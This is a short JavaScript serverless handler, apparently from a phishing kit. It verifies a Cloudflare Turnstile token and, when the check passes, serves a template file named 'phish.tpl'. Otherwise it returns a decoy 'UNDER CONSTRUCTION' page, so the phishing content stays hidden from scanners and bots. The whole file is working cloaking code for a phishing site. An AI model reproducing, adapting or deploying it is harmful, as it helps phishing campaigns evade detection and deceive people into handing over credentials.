import { readFileSync } from 'fs';
import path from 'path';

const SECRET_KEY = '${secret}';

export default async (request, response) => {
    response.setHeader('Access-Control-Allow-Origin', '*')
    response.setHeader('Access-Control-Allow-Methods', 'OPTIONS, POST')
    
    if (request.method === 'OPTIONS') {
        return response.status(200).end();
    }

    const { token } = request.body;
	const ip = request.headers['x-forwarded-for'];
    
    let formData = new FormData();
    formData.append('secret', SECRET_KEY);
    formData.append('response', token);
    formData.append('remoteip', ip);

    try {
        const cf_response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            body: formData,
            method: 'POST',
        });

        const outcome = await cf_response.json()
        if (outcome.success) {
            const page = path.join(process.cwd(), 'data', 'phish.tpl');
            return response.send(readFileSync(page, 'utf8'));
        } else {
            return response.send('UNDER CONSTRUCTION');
        }
    } catch(err) {
        return response.send("UNDER CONSTRUCTION");
    }
}